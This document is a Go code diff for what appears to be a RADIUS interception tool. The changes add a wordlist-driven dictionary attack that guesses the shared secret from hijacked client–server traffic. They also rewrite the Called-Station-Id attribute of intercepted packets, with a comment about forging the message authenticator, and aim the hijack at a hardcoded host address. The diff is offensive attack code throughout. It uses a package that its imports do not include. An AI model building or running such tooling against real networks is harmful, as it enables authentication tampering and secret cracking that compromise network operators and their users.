@@ -1,6 +1,7 @@
 package main
 
 import (
+	"flag"
 	"fmt"
 	"net"
 	"radius/radiuspacket"
@@ -10,19 +11,48 @@ import (
 const authPort = 1812
 const accPort = 1813
 
-func manglePacket(manglePacket *radiuspacket.RadiusPacket, from net.UDPAddr, to net.UDPAddr) bool {
+const hostName = "169.254.63.10"
+
+func manglePacket(manglePacket *radiuspacket.RadiusPacket, from net.UDPAddr, to net.UDPAddr, clientToServer bool) bool {
+
+	var client, server net.UDPAddr
+
+	//Determine client and server
+	if clientToServer {
+		client = from
+		server = to
+	} else {
+		client = to
+		server = from
+	}
+
+	context := session.GetContextByClient(client)
+
+	status := context.GetSecretStatus()
+
+	switch status {
+	case session.SecretUnknown:
+		fmt.Println("No secret")
+		fmt.Println("Determine secret")
+		session.GuessSecret(*manglePacket, client, server, clientToServer)
+	case session.SecretOk:
+
+		ok, sta := manglePacket.GetCalledSTAID()
+
+		if ok {
+			fmt.Println("Called Sta", sta)
+			sta += "MOD"
+			manglePacket.SetCalledSTAID(sta)
+
+			//Modify message authenticator attribute
+		}
+
+	}
 
 	fmt.Println("Pck rcv from ", from, "to", to)
 
 	fmt.Println("Code:", manglePacket.GetCode())
 	fmt.Println("Id:", manglePacket.GetId())
-
-	present, sta := manglePacket.GetStrAttr(radiuspacket.CalledStationId)
-
-	if present {
-		fmt.Println("Called STA:", sta)
-		manglePacket.SetStrAttr(radiuspacket.CalledStationId, "00-19-86-81-1B-84:JAJA")
-	}
 
 	return true
 
@@ -30,10 +60,16 @@ func manglePacket(manglePacket *radiuspacket.RadiusPacket, from net.UDPAddr, to 
 
 func main() {
 
+	secrets := flag.String("secrets", "secrets.txt", "Secrets file to perform dictionary attacks")
+
+	flag.Parse()
+
+	session.SetConfig(*secrets)
+
 	//Init session
 	var mySession session.Session
 
-	mySession.Init(session.Active, "169.254.63.10", authPort, accPort)
+	mySession.Init(session.Active, hostName, authPort, accPort)
 
 	mySession.Hijack(manglePacket)
 }
